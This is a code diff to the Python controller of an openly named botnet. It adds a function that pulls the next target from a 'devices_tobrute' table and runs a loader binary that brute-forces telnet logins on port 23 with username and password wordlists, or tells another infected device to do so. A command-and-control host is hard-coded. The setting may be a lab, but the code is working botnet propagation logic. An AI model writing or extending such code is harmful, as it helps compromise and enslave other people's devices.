@@ -6,13 +6,18 @@ import inspect;
 import sys;
 import os;
 import telnetlib3;
+import subprocess;
+import socket;
 import sqlite3
 
 path = os.path.dirname(inspect.stack()[0][1])
+default_bin_path = os.path.join(path, "../bin")
+default_wordlist_path = os.path.join(path, "../wordlists")
 default_db_path = os.path.join(os.path.dirname(inspect.stack()[0][1]), "../db/botnet.db")
 DB   = os.getenv("DB_PATH", default_db_path)
 CC_HOST = "172.18.0.1"
 CC_PORT = "8000"
+self_ip = socket.gethostbyname(socket.gethostname())
 
 def get_con():
     con = sqlite3.connect(DB, check_same_thread=False)
@@ -20,7 +25,8 @@ def get_con():
     return con
 
 def main():
-    print("Hi I'm main and I'm useless for now :/\n")
+    print(f"self_ip: {self_ip}")
+    brute_next_device()
 
 
 # this and the below function install programs have the purpose of
@@ -62,6 +68,31 @@ def get_device_data_from_db(ip):
     con.close()
 
     return rows
+
+# picks first device from db row and brutes it, removes from tobrute and adds to device
+def brute_next_device():
+    con = get_con()
+    rows = con.execute(
+        """
+        SELECT device_id, ip, scanned_by_ip
+        FROM devices_tobrute
+    """).fetchone()
+
+    device_id, ip, scanned_by_ip = rows
+    if (scanned_by_ip == self_ip):
+        # spawn loader in this device
+        subprocess.run([f"{default_bin_path}/loader_amd64", ip, "23", f"{default_wordlist_path}/testuser.txt", f"{default_wordlist_path}/testpass.txt", "20"])
+        pass
+    else:
+        instruction = f"load {ip}"
+        con.execute("""
+            UPDATE devices
+            SET instruction = (?)
+            WHERE ip = (?)
+        """, [instruction, scanned_by_ip])
+        #TODO: delete after done
+
+    con.close()
 
 async def install_programs(ip):
     data = get_device_data_from_db(ip)
